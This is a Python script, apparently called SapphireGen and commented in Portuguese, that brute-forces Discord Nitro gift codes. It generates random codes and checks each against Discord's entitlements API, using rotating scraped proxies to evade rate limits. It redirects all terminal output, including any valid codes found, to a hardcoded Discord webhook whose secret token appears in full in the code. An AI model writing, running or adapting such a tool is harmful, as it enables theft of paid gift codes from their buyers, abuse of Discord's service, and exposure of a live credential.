import sys
import time
from time import localtime, strftime, sleep
from colorama import Fore
import requests
import random
import string
import os

# Função para enviar mensagens para o Webhook do Discord
def send_webhook(webhook_url, message):
    payload = {"content": message}
    try:
        response = requests.post(webhook_url, json=payload)
        if response.status_code == 204:
            print(f"{Fore.GREEN}[{strftime('%H:%M', localtime())}] Mensagem enviada para o webhook.")
        else:
            print(f"{Fore.RED}[{strftime('%H:%M', localtime())}] Erro ao enviar mensagem para o webhook.")
    except Exception as e:
        print(f"{Fore.RED}[{strftime('%H:%M', localtime())}] Erro ao enviar mensagem para o webhook: {e}")

# Redirecionar as saídas do terminal (print) para o Webhook
class WebhookOutput:
    def __init__(self, webhook_url):
        self.webhook_url = webhook_url

    def write(self, message):
        if message.strip():  # Envia apenas mensagens não vazias
            send_webhook(self.webhook_url, message)

    def flush(self):
        pass  # Necessário para o funcionamento adequado do `sys.stdout`

class SapphireGen:
    def __init__(self, code_type: str, prox=None, codes=None, webhook_url=None):
        self.type = code_type
        self.codes = int(codes)
        self.proxies = prox
        self.session = requests.Session()
        self.prox_api = (
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt"
        )
        self.webhook_url = webhook_url

    def __proxies__(self):
        req = self.session.get(self.prox_api).text
        if req:
            open("./data/proxies.txt", "w").write(req.strip())

    def send_webhook(self, message):
        send_webhook(self.webhook_url, message)

    def generate(self, scrape=None):
        if scrape == "True":
            self.__proxies__()

        os.system("cls" if os.name == "nt" else "clear")
        print(f"{Fore.BLUE}Iniciando geração de códigos...")

        valid_codes = 0
        generated_codes = set()
        while valid_codes < self.codes:
            try:
                if self.proxies == "True":
                    prox = {
                        "http": random.choice(
                            open("./data/proxies.txt", "r").read().splitlines()
                        )
                    }
                else:
                    prox = None

                code = "".join(
                    random.choices(string.ascii_letters + string.digits, k=24 if self.type == "boost" else 16)
                )

                if code in generated_codes:
                    continue
                generated_codes.add(code)

                req = self.session.get(
                    f"https://discordapp.com/api/entitlements/gift-codes/{code}",
                    proxies=prox,
                    timeout=10,
                ).status_code

                if req == 200:
                    print(f"{Fore.GREEN}[{strftime('%H:%M', localtime())}] Código válido encontrado: discord.gift/{code}")
                    open("./data/valid.txt", "a").write(f"discord.gift/{code}\n")
                    valid_codes += 1
                    self.send_webhook(f"Código válido encontrado: discord.gift/{code}")
                elif req == 429:
                    print(f"{Fore.YELLOW}[{strftime('%H:%M', localtime())}] Rate limitado ao validar código: discord.gift/{code}")
                    self.send_webhook(f"Rate limitado ao validar código: discord.gift/{code}")
                    sleep(2)
            except Exception as e:
                print(f"{Fore.RED}[{strftime('%H:%M', localtime())}] Erro: {e}")
                self.send_webhook(f"Erro: {e}")

        print(f"\n{Fore.BLUE}[{strftime('%H:%M', localtime())}] Verificação concluída para {self.codes} códigos válidos.")
        self.send_webhook(f"Verificação concluída para {self.codes} códigos válidos.")
        sleep(1.5)
        os.system("cls" if os.name == "nt" else "clear")

if __name__ == "__main__":
    # A URL do webhook já foi configurada diretamente no código
    webhook_url = "https://discord.com/api/webhooks/1346085542026149949/xdN-GdWGAtUOgUXIWeLnRyl4FVpz3OMhxV0V1bM3ujIXVZb_tedcPlj-4HDCgvwHVHxg"

    # Redireciona as saídas do terminal para o webhook
    sys.stdout = WebhookOutput(webhook_url)

    while True:
        print(f"{Fore.BLUE}[{strftime('%H:%M', localtime())}] Tipo de código (boost, classic): ", end="")
        code_type = input()
        print(f"{Fore.BLUE}[{strftime('%H:%M', localtime())}] Usar proxies (True, False): ", end="")
        prox = input()
        if prox == "True":
            print(f"{Fore.BLUE}[{strftime('%H:%M', localtime())}] Coletar proxies automaticamente (True, False): ", end="")
            scrape_proxy = input()
        else:
            scrape_proxy = False
        print(f"{Fore.BLUE}[{strftime('%H:%M', localtime())}] Número de códigos válidos desejados: ", end="")
        codes = input()

        # Passando a URL do webhook para a classe SapphireGen
        SapphireGen(code_type, prox, codes, webhook_url).generate(scrape=scrape_proxy)
